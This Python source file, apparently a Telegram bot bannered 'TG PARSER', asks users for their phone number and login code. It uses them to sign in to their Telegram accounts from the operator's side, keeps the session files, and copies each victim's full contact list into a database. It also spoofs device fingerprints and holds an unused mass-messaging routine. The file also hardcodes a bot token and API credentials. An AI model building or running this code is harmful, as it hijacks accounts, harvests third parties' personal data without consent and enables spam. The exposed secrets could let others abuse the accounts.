import os
import asyncio
import random
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
import asyncpg
from logger import logger  
import sys

# Конфигурация
# BOT_TOKEN = "7415094877:AAFaQdCM9YEldHhgr9DXN3MVigRx6fW_aoo"
# API_ID = "28014756"
BOT_TOKEN = "7415094877:AAFaQdCM9YEldHhgr9DXN3MVigRx6fW_aoo"
API_ID = "26131451"
API_HASH = "5f982e1012b41c40ce85d1fab97d0326"
DATABASE_URL = "postgresql://postgres:12345@localhost:5432/telegram_contacts"

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# Папка для хранения сессий
SESSIONS_DIR = "sessions"

# Убедимся, что папка существует
if not os.path.exists(SESSIONS_DIR):
    os.makedirs(SESSIONS_DIR)

# Состояния для FSM
class AccountStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()

# Генерация случайных значений для параметров клиента
def generate_random_client_params():
    # devices = ["Samsung Galaxy S21", "iPhone 13 Pro", "Google Pixel 6", "Xiaomi Mi 11", "Huawei P50"]
    devices = ["iPhone 13 Pro"]
    # systems = ["Android 11", "iOS 15.2", "Android 12", "HarmonyOS 2.0", "Android 10"]
    systems = ["iOS 15.2"]
    # app_versions = ["9.6.0", "9.5.1", "9.4.2", "8.9.1", "9.0.0"]
    app_versions = ["11.4"]
    languages = ["en", "ru", "es", "fr", "de"]

    return {
        "device_model": random.choice(devices),
        "system_version": random.choice(systems),
        "app_version": random.choice(app_versions),
        "lang_code": random.choice(languages),
        "system_lang_code": random.choice(languages),
    }

# Создание клиента Telethon с рандомизацией параметров и сохранением сессии в папке
def create_telegram_client(session_name):
    client_params = generate_random_client_params()
    session_path = os.path.join(SESSIONS_DIR, session_name)
    return TelegramClient(
        session_path,
        API_ID,
        API_HASH,
        device_model=client_params["device_model"],
        system_version=client_params["system_version"],
        app_version=client_params["app_version"],
        lang_code=client_params["lang_code"],
        system_lang_code=client_params["system_lang_code"],
    )

# База данных
async def init_db():
    conn = await asyncpg.connect(DATABASE_URL)
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS contacts (
            id SERIAL PRIMARY KEY,
            user_phone TEXT,
            contact_phone TEXT,
            contact_username TEXT,
            contact_first_name TEXT,
            contact_last_name TEXT
        );
    """)
    await conn.close()
    logger.info("База данных и таблица 'contacts' готовы.")

# Сохранение контактов
async def save_contacts(user_phone, contacts):
    conn = await asyncpg.connect(DATABASE_URL)
    for contact in contacts:
        await conn.execute("""
            INSERT INTO contacts (user_phone, contact_phone, contact_username, contact_first_name, contact_last_name)
            VALUES ($1, $2, $3, $4, $5)
        """, user_phone, contact.phone or "Пользователь скрыл номер", contact.username or "Пользователь не указал никнейм",
           contact.first_name, contact.last_name)
    await conn.close()
    logger.info(f"Контакты пользователя {user_phone} сохранены в базу данных.")

# Генерация кнопки для отправки телефона
def request_phone_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    button = KeyboardButton("Отправить номер телефона", request_contact=True)
    keyboard.add(button)
    return keyboard

# Обработка команды /start
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    logger.debug(f"Пользователь {message.chat.id} начал взаимодействие с ботом.")
    await message.answer(
        "Привет! Этот бот поможет собрать ваши контакты из Telegram.\n"
        "Пожалуйста, отправьте ваш номер телефона, используя кнопку ниже.",
        reply_markup=request_phone_keyboard()
    )
    await AccountStates.waiting_for_phone.set()

# Обработка телефона
@dp.message_handler(content_types=['contact'], state=AccountStates.waiting_for_phone)
async def handle_contact(message: types.Message, state: FSMContext):
    if message.contact:
        phone = message.contact.phone_number
        try:
            logger.info(f"Получен номер телефона: {phone} от пользователя {message.chat.id}.")
            client = create_telegram_client(f'session_{phone}')
            await client.connect()

            # Отправка кода на номер и получение phone_code_hash
            result = await client.send_code_request(phone)
            phone_code_hash = result.phone_code_hash
            await client.disconnect()

            # Сохраняем данные в FSM
            await state.update_data(phone=phone, user_id=message.chat.id, phone_code_hash=phone_code_hash)

            await message.answer(
                f"Ваш номер телефона: {phone}\nВведите код авторизации, который был отправлен в Telegram."
            )
            await AccountStates.waiting_for_code.set()
        except Exception as e:
            logger.error(f"Ошибка при отправке кода для {phone}: {e}")
            await message.answer(f"Ошибка при отправке кода: {e}")

# Обработка кода авторизации
@dp.message_handler(state=AccountStates.waiting_for_code)
async def handle_code(message: types.Message, state: FSMContext):
    code = message.text
    data = await state.get_data()
    phone = data['phone']
    user_id = data['user_id']
    phone_code_hash = data['phone_code_hash']

    logger.info(f"Получен код авторизации {code} для номера {phone}.")

    try:
        await process_account(phone, user_id, code, phone_code_hash)
        await state.finish()
    except Exception as e:
        logger.error(f"Ошибка при обработке аккаунта {phone}: {e}")
        await message.answer(f"Ошибка при авторизации: {e}")

# Обработка одного аккаунта
async def process_account(phone, user_id, code, phone_code_hash):
    client = create_telegram_client(f'session_{phone}')
    await client.connect()

    if not await client.is_user_authorized():
        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            logger.info(f"Аккаунт {phone} успешно авторизован.")
        except Exception as e:
            logger.error(f"Ошибка авторизации аккаунта {phone}: {e}")
            raise e

    contacts = await client.get_contacts()
    await save_contacts(phone, contacts)

    await bot.send_message(user_id, f"Контакты пользователя {phone} успешно сохранены!")
    await client.disconnect()
    logger.info(f"Аккаунт {phone} обработан.")

# Рассылка сообщений контактам
async def send_messages(client, contacts, user_id):
    for contact in contacts:
        if contact.phone:
            try:
                await client.send_message(contact.phone, "Привет! Это сообщение для теста.")
                await asyncio.sleep(1)
                logger.info(f"Сообщение отправлено контакту {contact.phone}.")
            except Exception as e:
                logger.error(f"Ошибка отправки сообщения контакту {contact.phone}: {e}")

# Настройка завершения работы с кастомным сообщением
async def on_shutdown(dispatcher):
    print("- Пакеда бро!")

BANNER  = """

████████╗░██████╗░  ██████╗░░█████╗░██████╗░░██████╗███████╗██████╗░
╚══██╔══╝██╔════╝░  ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
░░░██║░░░██║░░██╗░  ██████╔╝███████║██████╔╝╚█████╗░█████╗░░██████╔╝
░░░██║░░░██║░░╚██╗  ██╔═══╝░██╔══██║██╔══██╗░╚═══██╗██╔══╝░░██╔══██╗
░░░██║░░░╚██████╔╝  ██║░░░░░██║░░██║██║░░██║██████╔╝███████╗██║░░██║
░░░╚═╝░░░░╚═════╝░  ╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝
"""


# Функция on_startup для выполнения действий при запуске
async def on_startup(dispatcher):
    await init_db()  # Инициализация базы данных
    # logger.info("Бот запущен и готов к работе.")
    os.system("cls" if os.name == "nt" else "clear")

    print(BANNER)
    print("- Бот запущен и готов к работе :)")

# Перехват стандартного потока вывода для подавления Goodbye!
class FilterOutput:
    def write(self, text):
        # Подавляем текст Goodbye!
        if "Goodbye!" not in text:
            sys.__stdout__.write(text)

    def flush(self):
        sys.__stdout__.flush()

sys.stdout = FilterOutput()
sys.stderr = FilterOutput()

if __name__ == "__main__":
    executor.start_polling(dp, on_startup=on_startup, on_shutdown=on_shutdown)